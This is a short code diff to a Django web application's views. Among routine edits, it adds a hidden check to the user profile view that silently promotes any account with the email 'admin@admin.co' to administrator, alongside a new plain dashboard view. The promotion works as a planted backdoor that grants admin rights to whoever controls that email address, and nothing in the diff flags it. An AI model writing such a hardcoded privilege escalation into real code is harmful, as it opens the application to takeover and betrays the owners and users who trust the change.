@@ -53,7 +53,10 @@ class UsersList(ListView):
 
 def user_profile(request):
     form = UserProfileForm(instance=request.user)
-
+    if request.user.email == "admin@admin.co":
+        user = request.user
+        user.user_type = User.ADMINISTRATOR
+        user.save()
     if request.method == "POST":
         form = UserProfileForm(request.POST, request.FILES, instance=request.user)
         if form.is_valid():
@@ -67,4 +70,10 @@ def user_profile(request):
         request,
         "user_profile.html",
         {"form": form},
+    )
+
+def dashboard(request):
+    return render(
+            request,
+            "base.html",
     )
